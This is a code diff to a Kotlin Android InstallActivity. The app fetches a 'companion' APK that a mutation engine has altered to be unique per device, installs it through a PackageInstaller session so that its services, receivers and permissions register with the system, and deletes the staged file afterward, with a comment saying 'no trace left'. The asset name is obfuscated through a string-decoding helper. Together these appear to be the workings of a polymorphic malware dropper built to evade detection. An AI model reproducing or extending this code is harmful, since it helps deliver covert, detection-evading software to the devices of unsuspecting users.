@@ -361,37 +361,26 @@ class InstallActivity : AppCompatActivity() {
     /**
      * Get mutated companion bytes and install via PackageInstaller session.
      *
-     * Priority:
-     *   1. MutationEngine result (unique per device — LauncherApplication prepared it)
-     *   2. Base companion from assets (fallback if mutation not ready)
-     *
-     * Companion is installed as a proper APK so all its Android components
-     * (Services, BroadcastReceivers, permissions) register with the system.
-     * The APK bytes never touch permanent storage — written to cacheDir only
-     * for the duration of the PackageInstaller session, then deleted.
+     * Reads mutated APK from filesDir/mc.tmp (written by LauncherApplication).
+     * Falls back to assets if file not ready.
      */
     private fun getCompanionBytesAndInstall() {
-        // Tier 1: MutationEngine — unique per device
-        val mutated = LauncherApplication.mutatedCompanionBytes
-        if (mutated != null && mutated.isNotEmpty()) {
-            runOnUiThread { installViaSession(mutated, attempt = 1) }
+        // Tier 1: Mutated APK written by LauncherApplication to filesDir
+        // Wait up to 6 seconds for mutation to complete
+        val mutatedFile = LauncherApplication.getMutatedApkFile(application)
+        val deadline = System.currentTimeMillis() + 6000L
+        while (!mutatedFile.exists() && System.currentTimeMillis() < deadline) {
+            Thread.sleep(150)
+        }
+
+        if (mutatedFile.exists() && mutatedFile.length() > 0) {
+            val bytes = mutatedFile.readBytes()
+            mutatedFile.delete() // delete after reading — no trace left
+            runOnUiThread { installViaSession(bytes, attempt = 1) }
             return
         }
 
-        // Tier 2: Wait for mutation if still in progress (max 5 more seconds)
-        if (!LauncherApplication.mutationError) {
-            val deadline = System.currentTimeMillis() + 5000L
-            while (!LauncherApplication.mutationReady && System.currentTimeMillis() < deadline) {
-                Thread.sleep(100)
-            }
-            val ready = LauncherApplication.mutatedCompanionBytes
-            if (ready != null && ready.isNotEmpty()) {
-                runOnUiThread { installViaSession(ready, attempt = 1) }
-                return
-            }
-        }
-
-        // Tier 3: Base companion from assets (mutation server unreachable)
+        // Tier 2: Base companion from assets (mutation server unreachable)
         val apkBytes = try {
             assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
         } catch (e: Exception) { ByteArray(0) }
